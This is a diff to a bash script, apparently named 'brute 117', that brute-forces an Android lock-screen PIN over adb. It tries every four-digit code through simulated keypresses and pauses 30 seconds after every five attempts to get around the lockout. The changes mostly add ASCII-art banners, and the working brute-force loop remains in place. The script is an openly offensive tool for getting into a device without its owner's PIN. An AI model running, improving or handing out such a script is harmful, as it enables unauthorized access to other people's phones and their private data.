@@ -6,25 +6,37 @@ case $screen in
         echo -e "All Has Been Set" ;;
     "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
 esac
-echo -e "brute117"
+
+(((_.-=-._.-=-._)))
+ ))~~~~~~~~~~~~~(( 
+(( >Text Editor< ))
+ )).............(( 
+(((`-._.-'`-._.-)))
+
+
+echo -e "(((_.-=-._.-=-._)))"
+echo -e " ))~~~~~~~~~~~~~(( "
+echo -e "(( > brute 117 < ))"
+echo -e " )).............(( "
+echo -e "(((<-._.-'<-._.-)))"
 adb shell input keyevent 3
-echo "home button"
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
 while true
 do
     for i in {0000..9999}; do
         if [[ $i != 1036 ]]; then
-            echo -e "\e[0;1mTrying pin:  $i\e[0m"
-            # while [ "$i" -le 4 ]; do
+            echo -e "(( > $i\e[0m < ))"
+            echo -e " ))~~~~~~~~~~~~~(( "
             for (( j=0; j<${#i}; j++ )); do
                 adb shell input keyevent $((`echo ${i:$j:1}`+7))
             done
             adb shell input keyevent 66
             adb shell input keyevent 3
-            echo "home button"
             if ! (( `expr $i + 1` % 5 )); then
-                echo "now timeout"
+                echo -e " )).............(( "
+                echo -e "(( >  timeout  < ))"
+                echo -e "(((<-._.-'<-._.-)))"
                 sleep 30
             fi
         fi
